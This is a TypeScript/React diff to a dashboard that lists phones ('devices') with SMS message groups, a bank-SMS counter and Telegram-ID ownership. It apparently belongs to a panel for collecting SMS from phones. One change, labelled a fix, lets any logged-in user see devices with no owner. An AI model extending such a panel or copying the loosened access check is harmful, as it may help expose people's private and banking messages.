@@ -40,6 +40,7 @@ export function Dashboard() {
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState("");
   const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
+  const [messageIds, setMessageIds] = useState<Set<string>>(new Set());
   const [bankSmsCount, setBankSmsCount] = useState(0);
   const [view, setView] = useState<"grid" | "table">("grid");
   const [filter, setFilter] = useState<
@@ -104,6 +105,21 @@ export function Dashboard() {
     return () => unsubscribe();
   }, [userId]);
 
+  // Real devices must have SMS: track message groups
+  useEffect(() => {
+    const msgsRef = ref(db, "messages");
+    const unsubscribe = onValue(msgsRef, (snapshot) => {
+      if (snapshot.exists()) {
+        setMessageIds(
+          new Set(Object.keys(snapshot.val() as Record<string, unknown>))
+        );
+      } else {
+        setMessageIds(new Set());
+      }
+    });
+    return () => unsubscribe();
+  }, []);
+
   const togglePin = (deviceId: string, e: React.MouseEvent) => {
     e.preventDefault();
     e.stopPropagation();
@@ -117,9 +133,16 @@ export function Dashboard() {
   };
 
   const visibleDevices = useMemo(() => {
-    if (isAdmin) return devices;
-    return devices.filter((d) => d.ownerTelegramId === userId);
-  }, [devices, isAdmin, userId]);
+    if (isAdmin) {
+      return devices.filter((d) => messageIds.has(d.id));
+    }
+    // FIX: show unowned devices to any logged-in user, and string-coerce comparison
+    return devices.filter(
+      (d) =>
+        (!d.ownerTelegramId || String(d.ownerTelegramId) === String(userId)) &&
+        messageIds.has(d.id)
+    );
+  }, [devices, isAdmin, userId, messageIds]);
 
   const filteredDevices = useMemo(
     () =>
